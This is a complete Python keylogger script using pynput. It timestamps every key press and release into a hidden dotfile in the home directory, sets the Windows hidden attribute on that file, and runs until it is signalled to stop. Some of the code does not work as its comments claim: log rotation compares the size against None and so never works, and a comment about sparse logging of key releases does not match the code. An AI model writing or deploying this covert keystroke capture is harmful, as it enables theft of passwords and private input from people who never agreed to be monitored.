from pynput import keyboard
import os
import sys
import time
import threading
import signal

# --- Configuration ---
HOME = os.path.expanduser('~')
LOG_FILENAME = '.hidden_keystrokes.log'  # dotfile works as hidden on Unix-like systems
LOG_PATH = os.path.join(HOME, LOG_FILENAME)
MAX_LOG_SIZE_BYTES = None  # optional rotation threshold (10 MB)
ROTATED_SUFFIX = '.old'

# --- Windows: helper to set hidden attribute ---
def _set_windows_hidden(path: str):
    try:
        if os.name != 'nt':
            return
        import ctypes
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(str(path), FILE_ATTRIBUTE_HIDDEN)
        if ret == 0:
            # non-fatal — just print to stderr
            print('Warning: failed to set hidden attribute on Windows file:', path, file=sys.stderr)
    except Exception as e:
        print('Warning: exception setting hidden attribute:', e, file=sys.stderr)

# --- Log writing ---
log_lock = threading.Lock()

def rotate_log_if_needed():
    try:
        if not os.path.exists(LOG_PATH):
            return
        size = os.path.getsize(LOG_PATH)
        if size >= MAX_LOG_SIZE_BYTES:
            rotated = LOG_PATH + ROTATED_SUFFIX
            if os.path.exists(rotated):
                try:
                    os.remove(rotated)
                except Exception:
                    pass
            os.replace(LOG_PATH, rotated)
            # ensure new file created and hidden on Windows
            open(LOG_PATH, 'a').close()
            _set_windows_hidden(LOG_PATH)
    except Exception as e:
        print('Warning: could not rotate log:', e, file=sys.stderr)


def write_to_log(text: str):
    text = text.replace('\r', '')
    with log_lock:
        try:
            rotate_log_if_needed()
            with open(LOG_PATH, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(text)
                f.flush()
                os.fsync(f.fileno())
        except Exception as e:
            # avoid crashing the listener on unexpected IO errors
            print('Warning: failed to write log:', e, file=sys.stderr)

# --- Keyboard handling ---
start_time = time.time()


def format_key(key):
    """Return a printable representation of a key press."""
    try:
        if isinstance(key, keyboard.KeyCode):
            return key.char if key.char is not None else str(key)
        else:
            # special key: Key.space -> [SPACE], Key.enter -> [ENTER], etc.
            name = str(key).split('.')[-1].upper()
            return f'[{name}]'
    except Exception:
        return f'[{key}]'


def on_press(key):
    ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    payload = f'{ts} - PRESSED  - {format_key(key)}\n'
    write_to_log(payload)


def on_release(key):
    # we intentionally log releases more sparsely to reduce log size; comment out if you want releases
    ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    payload = f'{ts} - RELEASED - {format_key(key)}\n'
    write_to_log(payload)
    # do not stop on any key; run until external interrupt

# --- Graceful shutdown handling ---
stop_event = threading.Event()


def _signal_handler(signum, frame):
    write_to_log(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - INFO - Stopping listener (signal {signum})\n")
    stop_event.set()

signal.signal(signal.SIGINT, _signal_handler)
if hasattr(signal, 'SIGTERM'):
    signal.signal(signal.SIGTERM, _signal_handler)

# --- Ensure log file exists and is hidden on Windows ---
try:
    open(LOG_PATH, 'a').close()
    if os.name == 'nt':
        _set_windows_hidden(LOG_PATH)
except Exception as e:
    print('Warning: could not create or hide log file:', e, file=sys.stderr)

# --- Main listener ---
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

try:
    write_to_log(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - INFO - Keylogger started on this machine.\n")
    listener.start()
    # Wait until a stop signal is set
    while not stop_event.is_set():
        time.sleep(0.2)
    listener.stop()
    write_to_log(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - INFO - Keylogger stopped.\n")
except Exception as e:
    print('Fatal error:', e, file=sys.stderr)
    write_to_log(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR - Fatal: {e}\n")
